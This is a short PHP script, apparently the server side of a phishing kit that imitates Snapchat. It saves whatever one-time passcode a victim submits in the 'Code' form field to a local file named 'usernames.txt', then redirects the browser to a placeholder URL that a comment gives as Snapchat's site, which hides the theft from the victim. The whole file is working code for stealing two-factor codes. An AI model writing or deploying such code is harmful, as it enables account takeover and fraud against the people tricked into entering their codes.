<?php
file_put_contents("usernames.txt", "OTP: " . $_POST['Code'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.snapchat.com
header("Location: $url");
exit();
?>